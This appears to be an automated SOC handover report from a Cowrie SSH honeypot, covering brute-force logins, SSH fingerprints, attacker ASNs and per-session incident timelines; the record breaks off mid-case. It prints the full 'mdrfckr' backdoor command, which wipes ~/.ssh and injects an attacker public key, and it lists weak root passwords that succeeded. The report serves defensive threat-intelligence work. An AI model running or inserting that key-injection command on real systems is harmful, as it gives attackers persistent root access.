# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-11 |
| **Generated At** | 2026-05-11T22:59:05Z |
| **Shift Time** | 22:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **311** |
| Confirmed Threats | **66** |
| False Positives Filtered | **245** (78.8%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **14** |
| High Severity Cases | **33** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **278** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **59** |
| Unique Credential Pairs | **29** |
| Unique Usernames | **12** |
| Unique Passwords | **28** |
| Successful Auth Pairs | **19** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 33 |
| `345gs5662d34` | 16 |
| `developer` | 1 |
| `hadoop` | 1 |
| `ubuntu` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 16 |
| `3245gs5662d34` | 16 |
| `123456` | 2 |
| `daniel12` | 1 |
| `Sagar@123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 16 |
| `root` | `3245gs5662d34` | 16 |
| `root` | `daniel12` | 1 |
| `root` | `Sagar@123` | 1 |
| `root` | `Abc123!!!` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `daniel12` | `77.54.41.203` | 2026-05-11T21:25:47 |
| `root` | `3245gs5662d34` | `77.54.41.203` | 2026-05-11T21:25:51 |
| `root` | `Sagar@123` | `77.54.41.203` | 2026-05-11T21:26:36 |
| `root` | `Abc123!!!` | `77.54.41.203` | 2026-05-11T21:27:25 |
| `root` | `Ab1234` | `77.54.41.203` | 2026-05-11T21:28:13 |
| `root` | `root_123` | `77.54.41.203` | 2026-05-11T21:29:51 |
| `root` | `rd@123456` | `77.54.41.203` | 2026-05-11T21:30:42 |
| `root` | `root666` | `77.54.41.203` | 2026-05-11T21:31:35 |
| `root` | `qwe@2026` | `77.54.41.203` | 2026-05-11T21:33:18 |
| `root` | `qq.com` | `77.54.41.203` | 2026-05-11T21:34:09 |
| `root` | `123456qqq` | `77.54.41.203` | 2026-05-11T21:34:58 |
| `root` | `Temp2025` | `77.54.41.203` | 2026-05-11T21:35:49 |
| `root` | `Automation@123` | `77.54.41.203` | 2026-05-11T21:36:39 |
| `root` | `Asd@123` | `77.54.41.203` | 2026-05-11T21:38:23 |
| `root` | `dl123456` | `77.54.41.203` | 2026-05-11T21:39:15 |
| `root` | `marlboro` | `77.54.41.203` | 2026-05-11T21:40:06 |
| `root` | `4rfvBGT%` | `83.235.16.111` | 2026-05-11T21:43:19 |
| `root` | `3245gs5662d34` | `83.235.16.111` | 2026-05-11T21:43:25 |
| `root` | `abcd@1234` | `106.12.144.153` | 2026-05-11T22:38:09 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **311** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 55 |
| Go SSH scanner | 11 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 54 | 4 |
| `0a07365cc01f...` | Generic scanner | 7 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `14b2ddda386a...` | Mirai/variant | 1 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 54 | 4 | libssh-based |
| `0a07365cc01f...` | Go SSH scanner | 7 | 1 | Generic scanner |
| `95420f9d932d...` | Go SSH scanner | 3 | 2 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `14b2ddda386a...` | libssh | 1 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 16 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `83.235.16.111`, `77.54.41.203`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **17** |
| High-Risk ASNs | **7** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS135799` | Rapidnet Private Limited | 2 | LOW |
| `AS269730` | TECNOVEN SERVICES CA | 1 | LOW |
| `AS272122` | TELECOMUNICACIONES G-NETWORK, C.A. | 1 | LOW |
| `AS12353` | Vodafone Portugal | 1 | HIGH |
| `AS6799` | Ote SA (Hellenic Telecommunications Organisation) | 1 | HIGH |
| `AS36884` | Wana Corporate | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (33)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8b9b0d292775

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:25 |
| **Last Seen** | 2026-05-11 21:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:25:46` | `cowrie.session.connect` |
| `2026-05-11 21:25:46` | `cowrie.client.version` |
| `2026-05-11 21:25:46` | `cowrie.client.kex` |
| `2026-05-11 21:25:47` | `cowrie.login.success` |
| `2026-05-11 21:25:47` | `cowrie.session.params` |
| `2026-05-11 21:25:47` | `cowrie.command.input` |
| `2026-05-11 21:25:47` | `cowrie.command.failed` |
| `2026-05-11 21:25:47` | `cowrie.log.closed` |
| `2026-05-11 21:25:48` | `cowrie.session.params` |
| `2026-05-11 21:25:48` | `cowrie.command.input` |
| `2026-05-11 21:25:48` | `cowrie.session.file_download` |
| `2026-05-11 21:25:48` | `cowrie.log.closed` |
| `2026-05-11 21:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6356273f4bf3

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:25 |
| **Last Seen** | 2026-05-11 21:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:25:50` | `cowrie.session.connect` |
| `2026-05-11 21:25:50` | `cowrie.client.version` |
| `2026-05-11 21:25:51` | `cowrie.client.kex` |
| `2026-05-11 21:25:51` | `cowrie.login.success` |
| `2026-05-11 21:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2a4688aadd9

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:26 |
| **Last Seen** | 2026-05-11 21:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:26:35` | `cowrie.session.connect` |
| `2026-05-11 21:26:35` | `cowrie.client.version` |
| `2026-05-11 21:26:35` | `cowrie.client.kex` |
| `2026-05-11 21:26:36` | `cowrie.login.success` |
| `2026-05-11 21:26:36` | `cowrie.session.params` |
| `2026-05-11 21:26:36` | `cowrie.command.input` |
| `2026-05-11 21:26:36` | `cowrie.command.failed` |
| `2026-05-11 21:26:36` | `cowrie.log.closed` |
| `2026-05-11 21:26:37` | `cowrie.session.params` |
| `2026-05-11 21:26:37` | `cowrie.command.input` |
| `2026-05-11 21:26:37` | `cowrie.session.file_download` |
| `2026-05-11 21:26:37` | `cowrie.log.closed` |
| `2026-05-11 21:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02f10eb47692

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:26 |
| **Last Seen** | 2026-05-11 21:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:26:40` | `cowrie.session.connect` |
| `2026-05-11 21:26:40` | `cowrie.client.version` |
| `2026-05-11 21:26:40` | `cowrie.client.kex` |
| `2026-05-11 21:26:40` | `cowrie.login.success` |
| `2026-05-11 21:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cb8454030ca

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:27 |
| **Last Seen** | 2026-05-11 21:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:27:24` | `cowrie.session.connect` |
| `2026-05-11 21:27:24` | `cowrie.client.version` |
| `2026-05-11 21:27:24` | `cowrie.client.kex` |
| `2026-05-11 21:27:25` | `cowrie.login.success` |
| `2026-05-11 21:27:25` | `cowrie.session.params` |
| `2026-05-11 21:27:25` | `cowrie.command.input` |
| `2026-05-11 21:27:25` | `cowrie.command.failed` |
| `2026-05-11 21:27:26` | `cowrie.log.closed` |
| `2026-05-11 21:27:26` | `cowrie.session.params` |
| `2026-05-11 21:27:26` | `cowrie.command.input` |
| `2026-05-11 21:27:26` | `cowrie.session.file_download` |
| `2026-05-11 21:27:26` | `cowrie.log.closed` |
| `2026-05-11 21:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da99063ebd28

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:27 |
| **Last Seen** | 2026-05-11 21:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:27:29` | `cowrie.session.connect` |
| `2026-05-11 21:27:29` | `cowrie.client.version` |
| `2026-05-11 21:27:29` | `cowrie.client.kex` |
| `2026-05-11 21:27:30` | `cowrie.login.success` |
| `2026-05-11 21:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-128eb1a81d5d

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:28 |
| **Last Seen** | 2026-05-11 21:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:28:12` | `cowrie.session.connect` |
| `2026-05-11 21:28:12` | `cowrie.client.version` |
| `2026-05-11 21:28:13` | `cowrie.client.kex` |
| `2026-05-11 21:28:13` | `cowrie.login.success` |
| `2026-05-11 21:28:14` | `cowrie.session.params` |
| `2026-05-11 21:28:14` | `cowrie.command.input` |
| `2026-05-11 21:28:14` | `cowrie.command.failed` |
| `2026-05-11 21:28:14` | `cowrie.log.closed` |
| `2026-05-11 21:28:14` | `cowrie.session.params` |
| `2026-05-11 21:28:14` | `cowrie.command.input` |
| `2026-05-11 21:28:15` | `cowrie.session.file_download` |
| `2026-05-11 21:28:15` | `cowrie.log.closed` |
| `2026-05-11 21:28:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d27762f64e3b

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:28 |
| **Last Seen** | 2026-05-11 21:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:28:17` | `cowrie.session.connect` |
| `2026-05-11 21:28:17` | `cowrie.client.version` |
| `2026-05-11 21:28:17` | `cowrie.client.kex` |
| `2026-05-11 21:28:18` | `cowrie.login.success` |
| `2026-05-11 21:28:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd6f8a0cc64c

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:29 |
| **Last Seen** | 2026-05-11 21:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:29:50` | `cowrie.session.connect` |
| `2026-05-11 21:29:50` | `cowrie.client.version` |
| `2026-05-11 21:29:51` | `cowrie.client.kex` |
| `2026-05-11 21:29:51` | `cowrie.login.success` |
| `2026-05-11 21:29:52` | `cowrie.session.params` |
| `2026-05-11 21:29:52` | `cowrie.command.input` |
| `2026-05-11 21:29:52` | `cowrie.command.failed` |
| `2026-05-11 21:29:52` | `cowrie.log.closed` |
| `2026-05-11 21:29:52` | `cowrie.session.params` |
| `2026-05-11 21:29:52` | `cowrie.command.input` |
| `2026-05-11 21:29:53` | `cowrie.session.file_download` |
| `2026-05-11 21:29:53` | `cowrie.log.closed` |
| `2026-05-11 21:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33c620cd333b

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:29 |
| **Last Seen** | 2026-05-11 21:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:29:55` | `cowrie.session.connect` |
| `2026-05-11 21:29:55` | `cowrie.client.version` |
| `2026-05-11 21:29:55` | `cowrie.client.kex` |
| `2026-05-11 21:29:56` | `cowrie.login.success` |
| `2026-05-11 21:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08204284d610

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:30 |
| **Last Seen** | 2026-05-11 21:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:30:41` | `cowrie.session.connect` |
| `2026-05-11 21:30:41` | `cowrie.client.version` |
| `2026-05-11 21:30:42` | `cowrie.client.kex` |
| `2026-05-11 21:30:42` | `cowrie.login.success` |
| `2026-05-11 21:30:43` | `cowrie.session.params` |
| `2026-05-11 21:30:43` | `cowrie.command.input` |
| `2026-05-11 21:30:43` | `cowrie.command.failed` |
| `2026-05-11 21:30:43` | `cowrie.log.closed` |
| `2026-05-11 21:30:43` | `cowrie.session.params` |
| `2026-05-11 21:30:43` | `cowrie.command.input` |
| `2026-05-11 21:30:44` | `cowrie.session.file_download` |
| `2026-05-11 21:30:44` | `cowrie.log.closed` |
| `2026-05-11 21:30:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb6b71d14b53

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:30 |
| **Last Seen** | 2026-05-11 21:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:30:46` | `cowrie.session.connect` |
| `2026-05-11 21:30:46` | `cowrie.client.version` |
| `2026-05-11 21:30:46` | `cowrie.client.kex` |
| `2026-05-11 21:30:47` | `cowrie.login.success` |
| `2026-05-11 21:30:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c911a29fd52

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:31 |
| **Last Seen** | 2026-05-11 21:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:31:34` | `cowrie.session.connect` |
| `2026-05-11 21:31:34` | `cowrie.client.version` |
| `2026-05-11 21:31:34` | `cowrie.client.kex` |
| `2026-05-11 21:31:35` | `cowrie.login.success` |
